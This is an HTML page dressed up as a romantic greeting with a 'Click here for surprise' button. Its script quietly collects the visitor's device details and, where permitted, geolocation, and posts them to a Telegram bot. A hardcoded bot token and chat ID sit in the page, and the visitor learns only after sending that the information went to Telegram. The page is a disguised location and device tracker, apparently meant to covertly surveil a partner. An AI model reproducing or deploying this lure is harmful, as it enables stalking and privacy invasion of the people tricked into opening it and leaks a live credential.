<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Special Greeting üíñ</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(to right, #ff758c, #ff7eb3);
      font-family: 'Comic Sans MS', cursive, sans-serif;
      overflow: hidden;
    }
    .container {
      text-align: center;
      background: white;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0px 8px 20px rgba(0,0,0,0.2);
      max-width: 400px;
      position: relative;
      z-index: 10;
    }
    h1 {
      color: #ff4081;
      font-size: 2rem;
    }
    p {
      color: #333;
      font-size: 1.2rem;
      margin: 15px 0;
    }
    .btn {
      background: #ff4081;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 25px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn:hover {
      background: #e91e63;
    }
    .bubble {
      position: absolute;
      bottom: -100px;
      background: rgba(255,255,255,0.3);
      border-radius: 50%;
      animation: rise 10s infinite ease-in;
    }
    @keyframes rise {
      0% { transform: translateY(0) scale(1); opacity: 1; }
      100% { transform: translateY(-120vh) scale(1.5); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 id="greeting">Hello, Love üíï</h1>
    <p id="message">You mean the world to me. üåç‚ú®</p>
    <button class="btn" onclick="sendToTelegram()">üíå Click here for surprise </button>
  </div>

  <script>
    // --- Telegram Config ---
    const BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
    const CHAT_ID = "6000036430";

    // --- Greeting based on time ---
    function updateGreeting() {
      const hour = new Date().getHours();
      const greeting = document.getElementById("greeting");
      if (hour < 12) greeting.textContent = "Good Morning, Love ‚òÄÔ∏èüíï";
      else if (hour < 18) greeting.textContent = "Good Afternoon, Cutie üå∏";
      else greeting.textContent = "Good Evening, Darling üåôüíñ";
    }

    // --- Device info ---
    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
    }

    // --- Location ---
    function getLocation(callback) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            callback({
              latitude: pos.coords.latitude.toFixed(2),
              longitude: pos.coords.longitude.toFixed(2)
            });
          },
          () => callback(null)
        );
      } else {
        callback(null);
      }
    }

    // --- Send to Telegram ---
    function sendToTelegram() {
      const device = getDeviceInfo();
      getLocation((loc) => {
        let message = `üíå New Visitor Info\n\n` +
                      `üì± Platform: ${device.platform}\n` +
                      `üåê Browser: ${device.userAgent}\n` +
                      `üñ•Ô∏è Screen: ${device.screen}\n` +
                      `üïí Timezone: ${device.timezone}\n` +
                      `üåç Language: ${device.language}`;

        if (loc) {
          message += `\nüìç Location: ${loc.latitude}, ${loc.longitude}`;
        } else {
          message += `\nüìç Location: Not shared`;
        }

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        })
        .then(res => res.json())
        .then(data => {
          alert("‚úÖ Info sent to Telegram!");
          console.log("Sent:", data);
        })
        .catch(err => console.error("Error:", err));
      });
    }

    // --- Bubbles ---
    function createBubbles() {
      const bubble = document.createElement("div");
      bubble.classList.add("bubble");
      const size = Math.random() * 50 + 20;
      bubble.style.width = size + "px";
      bubble.style.height = size + "px";
      bubble.style.left = Math.random() * window.innerWidth + "px";
      bubble.style.animationDuration = (Math.random() * 5 + 5) + "s";
      document.body.appendChild(bubble);
      setTimeout(() => bubble.remove(), 10000);
    }
    setInterval(createBubbles, 500);

    // --- Init ---
    updateGreeting();
  </script>
</body>
</html>
